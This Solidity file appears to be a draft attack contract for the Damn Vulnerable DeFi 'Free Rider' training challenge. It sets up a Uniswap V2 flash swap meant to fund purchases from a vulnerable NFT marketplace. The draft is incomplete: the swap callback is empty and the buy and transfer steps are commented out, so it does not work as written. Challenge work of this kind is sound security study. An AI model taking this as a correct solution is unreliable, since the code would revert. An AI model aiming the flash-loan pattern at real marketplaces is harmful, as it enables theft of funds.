// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IFreeRiderBuyer {
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external;
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderAttack is IERC721Receiver {
    using Address for address payable;

    address partner;
    address nft;
    address buyer;
    address uniswapPair;
    address marketplace;

    constructor(
        address _partnerAddress,
        address _nftAddress,
        address _buyerContract,
        address _uniswapV2PairAddress,
        address _marketplaceAdress
    ) payable {
        partner = _partnerAddress;
        nft = _nftAddress;
        buyer = _buyerContract;
        uniswapPair = _uniswapV2PairAddress;
        marketplace = _marketplaceAdress;
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function execute(uint256[] calldata tokenIds) external payable {
        IUniswapV2Pair(uniswapPair).swap(120 ether, 0, address(this), hex"00");
        // IFreeRiderNFTMarketplace(marketplace).buyMany{value: msg.value}(
        //     tokenIds
        // );
        // transfer(tokenIds);
    }

    function transfer(uint256[] memory _tokenId) internal {
        for (uint256 i = 0; i < _tokenId.length; i++) {
            IERC721(nft).safeTransferFrom(address(this), buyer, _tokenId[i]);
        }
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {}

    receive() external payable {}

    fallback() external payable {}
}
